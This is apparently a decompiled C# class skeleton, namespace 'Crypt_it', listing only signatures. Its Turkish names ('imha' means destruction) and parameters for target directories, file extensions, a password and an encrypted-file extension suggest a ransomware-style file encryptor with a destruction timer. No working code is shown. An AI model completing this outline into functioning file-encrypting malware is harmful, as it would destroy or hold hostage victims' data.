namespace Crypt_it;

internal class Program
{
	public static string imha;

	private static extern void Main(string[] args);

	public static extern void imha_zamani();

	private static extern void Crypt(string[] dizin, string[] uzantilar, string sifre, string crypt_uzantisi);

	private static extern void Encrypt(string inputFile, string outputFile, byte[] passwordBytes);

	public extern Program();
}
